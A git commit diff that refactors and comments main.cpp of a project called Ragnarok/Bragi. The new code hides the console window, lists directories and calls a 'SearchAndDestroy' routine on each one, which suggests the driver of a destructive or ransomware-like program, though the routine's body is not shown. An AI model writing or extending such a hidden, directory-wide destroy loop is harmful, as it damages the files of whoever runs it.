148c2af0f10fc6d6910de23760df8ad8474f0702
xorz57 <fot@ceid.upatras.gr>
2017-11-16 00:55:49 +0200

    Add comments & Refactor code

--- Ragnarok/Bragi/main.cpp
+++ Ragnarok/Bragi/main.cpp
@@ -1,20 +1,22 @@
 #include "Bragi.h"
 #include <iostream>
 
-/*Comments will be posted later*/
-
 int main()
 {
+	// Hide Console
 	FreeConsole();
 	#ifdef _WIN32
+		// Support UTF-16 Encoding
 		_setmode(_fileno(stdout), _O_U16TEXT);
 	#endif
-	std::vector<std::wstring> v;
-	int i{};
-	v = ListDir(Path());
-	for (int i = 0; i < v.size(); i++)
+	// This vector keeps all directories
+	std::vector<std::wstring> directories;
+	directories = ListDir(Path());
+	// For each folder
+	for (auto dir : directories)
 	{
-		cd(v[i]);
+		// Move into this directory
+		SearchAndDestroy(dir);
 	}
 	return EXIT_SUCCESS;
 }
